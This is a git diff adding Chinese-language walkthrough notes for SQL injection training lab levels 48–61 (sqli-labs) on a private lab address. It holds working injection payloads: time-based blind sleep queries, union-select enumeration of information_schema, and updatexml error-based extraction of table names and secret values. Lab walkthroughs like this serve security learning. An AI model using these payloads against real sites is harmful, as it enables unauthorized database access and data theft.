@@ -1366,6 +1366,408 @@ desc
 
 ## 48. 数字型order by盲注
 
+1. 检查是否存在order by注入
+
+![image](https://user-images.githubusercontent.com/76896357/115129644-4dcff400-a01a-11eb-960e-4e65b4d4d1bc.png)
+
+存在
+2. 查看是否有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115129691-ca62d280-a01a-11eb-8f34-e0dcff5e9350.png)
+
+
+没有
+
+3. 试一下报错注入
+
+![image](https://user-images.githubusercontent.com/76896357/115129699-f8e0ad80-a01a-11eb-8696-f179b55f42fe.png)
+
+同样不行
+
+4. 绝招，延时注入
+```
+?sort=1 and if(substr(database(),1,1)='s',sleep(5),1)--+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115129769-a9e74800-a01b-11eb-9059-a41c883dcfb6.png)
+
+这就比较和谐了，之后利用bp爆破吧，和之前类似，设置两个参数，修改一个参数。。
+
+
+## 49. 字符型盲注
+
+* 猜测闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115130050-ab663f80-a01e-11eb-8572-1fa2d10f79a5.png)
+
+只要带单引号的包括‘，’)，均不会正常显示，那么几乎可以确定是‘闭合方式了
+
+* 看下有没有回显
+
+还是没有回显
+
+* 直接延时吧
+
+
+## 50. 数字型，堆叠order by注入
+
+* ![image](https://user-images.githubusercontent.com/76896357/115130206-2ed46080-a020-11eb-9a59-971a3fc9b466.png)
+
+存在order by注入
+
+* 查看有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115130222-4e6b8900-a020-11eb-9700-a7b2b3162bb2.png)
+
+说明可能存在报错注入
+
+* 尝试报错注入
+
+
+
+好吧，还是不行
+
+*延时注入
+```
+http://192.168.220.12/sqli/Less-50/?sort=1%20and%20length(database())=8%20and%20if(1=1,sleep(1),1)//多个and，有一个不满组都不行
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115130280-1add2e80-a021-11eb-8f21-619ff5dc9519.png)
+
+
+好吧还是延时注入
+
+接下来，就延时爆破吧
+
+
+## 51. 字符型，堆叠，orderby注入
+
+* 查看闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115130645-e5861000-a023-11eb-8a55-1ecebee107c4.png)
+
+
+很显然是‘的闭合方式
+
+* 查看有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115130641-dc953e80-a023-11eb-8c56-942ca88e3cae.png)
+
+* 直接延时注入吧
+```
+?sort=1' and length(database())=8 and if(1=1,sleep(2),1) or '1'='1
+```
+同样的套路
+
+![image](https://user-images.githubusercontent.com/76896357/115130838-832e0f00-a025-11eb-8a76-e98a59bd39d7.png)
+
+
+## 52.,52,53全部与上面类似
+
+## 54. 限制次数的查询
+
+* 查看闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115131043-5844ba80-a027-11eb-92d5-f5518c2e5ef3.png)
+
+有回显
+
+查库，
+
+```
+?id=0' union select 1,2,database() --+
+```
+
+
+得到challenges库
+
+
+查表
+
+```
+?id=0%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20--+
+```
+
+
+
+![image](https://user-images.githubusercontent.com/76896357/115131540-76141e80-a02b-11eb-9625-50fe5c349feb.png)
+
+
+查段
+
+```
+0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='5gp3nwnqh6' --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115131554-85936780-a02b-11eb-95ec-d30b78236931.png)
+
+* 查字段内容
+```
+?id=0%27%20union%20select%201,2,sessid%20from%20challenges.5gp3nwnqh6%20--+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115131589-bd021400-a02b-11eb-9135-e6da3895ede0.png)
+
+## 55. 基于小括号的挑战
+
+那啥这道题试上几十次就可以了，发现是)闭合
+
+* 查字段内容
+
+```
+?id=0)%20union%20select%201,2,sessid%20from%20challenges.5gp3nwnqh6%20--+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115131608-e622a480-a02b-11eb-8881-a019b0757c50.png)
+
+
+然后就随便了。。。
+
+## 56. ')挑战
+* 寻找闭合方式看看有没有回显
+```
+?id=1') --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115131735-f8e9a900-a02c-11eb-8e77-c5ee46eb2bb0.png)
+
+```
+?id=0') union select 1,2,3 --+
+```
+![image](https://user-images.githubusercontent.com/76896357/115131770-29314780-a02d-11eb-8400-4af1d307644a.png)
+
+
+过了。。。
+
+## 57. 基于“”的挑战
+
+* 找寻闭合方式
+
+尝试了几次，发现‘，’),"都可以，但是，“)不行
+
+![image](https://user-images.githubusercontent.com/76896357/115131821-a5c42600-a02d-11eb-8b85-87e2cd0876b6.png)
+
+说明，闭合方式就有可能是",
+
+* 看下有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115131863-dc9a3c00-a02d-11eb-8b7c-7a05618386ea.png)
+
+
+找到了，就是双引号，而且还有回显。。。
+
+查库
+
+![image](https://user-images.githubusercontent.com/76896357/115131883-0bb0ad80-a02e-11eb-8b87-559ce266fec8.png)
+
+
+就直接过了
+
+
+## 58. 不能用union select
+
+* 猜测闭合方式
+
+```
+http://192.168.220.12/sqli/Less-58/index.php?id=1%27%20%20--+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115132074-862dfd00-a02f-11eb-9b84-79e4eda7380d.png)
+
+''的闭合方式
+
+* 查看有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115131924-72ce6200-a02e-11eb-891d-21dcf4f58d27.png)
+
+没有回显
+
+* 查看会不会报错
+
+```
+http://192.168.220.12/sqli/Less-58/index.php?id=0%27%20and%20updatexml(1,concat(%27~%27,(select%20database()),%27~%27),1)%20--+
+```
+
+![image](https://user-images.githubusercontent.com/76896357/115132067-77dfe100-a02f-11eb-96d2-fb62f7981462.png)
+
+利用报错逐个查询吧
+
+
+## 59. 数字型报错挑战
+
+* 猜测闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115132165-5d5a3780-a030-11eb-8300-68fc47aae6de.png)
+
+很显然没有
+
+![image](https://user-images.githubusercontent.com/76896357/115132150-3ac81e80-a030-11eb-9bd6-fcb09d96274e.png)
+
+之后就。。。
+
+## 60. ")闭合方式的挑战
+
+* 查看闭合方式
+
+
+![image](https://user-images.githubusercontent.com/76896357/115132234-c2ae2880-a030-11eb-8ad8-44342a69786f.png)
+
+* 直接看一下能不能报错注入
+
+![image](https://user-images.githubusercontent.com/76896357/115132248-043ed380-a031-11eb-9ad9-f374aaa5f3b6.png)
+
+又是一道改变闭合方式的题
+
+## 61. '))的闭合方式
+
+* 查看闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/115132263-2c2e3700-a031-11eb-97ae-886f90e025bb.png)
+
+* 看一下能不能报错注入
+
+![image](https://user-images.githubusercontent.com/76896357/115132299-96df7280-a031-11eb-9aac-77b8256bb3aa.png)
+
+* 报表
+
+![image](https://user-images.githubusercontent.com/76896357/115132330-c2faf380-a031-11eb-9c67-17140a30089b.png)
+
+* 报列
+
+```
+http://192.168.220.12/sqli/Less-61/?id=1%27))%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27vhe0p7yp4g%27),%27~%27),1)%20--+
+```
+![image](https://user-images.githubusercontent.com/76896357/115132348-f6d61900-a031-11eb-9efa-50215c6bee2f.png)
+
+* 报字段
+
+```
+http://192.168.220.12/sqli/Less-61/?id=1%27))%20and%20updatexml(1,concat(%27~%27,(select%20sessid%20from%20challenges.vhe0p7yp4g),%27~%27),1)%20--+
+```
+![image](https://user-images.githubusercontent.com/76896357/115132399-62b88180-a032-11eb-9246-0c50d2624470.png)
+
+改一下，表名就好了。。
+
+## 62. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
